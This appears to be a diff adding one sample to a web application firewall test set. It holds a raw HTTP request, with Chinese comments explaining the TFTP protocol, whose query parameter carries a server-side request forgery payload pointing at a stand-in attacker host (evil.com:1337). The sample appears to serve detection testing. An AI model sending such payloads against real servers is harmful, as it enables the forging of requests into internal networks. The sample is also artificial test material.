@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_TFTP协议
+# TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
+GET /?id=tftp:%2F%2Fevil.com:1337%2FTESTUDPPACKET&bid=hd_tag_m8mv25t4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25t4
+RM-PRO-Token: 6b516e719f3218d20fb3cade2525bfee
+RM-PRO-Time: 1742808505486
+User-Agent: curl/7.83.1
+
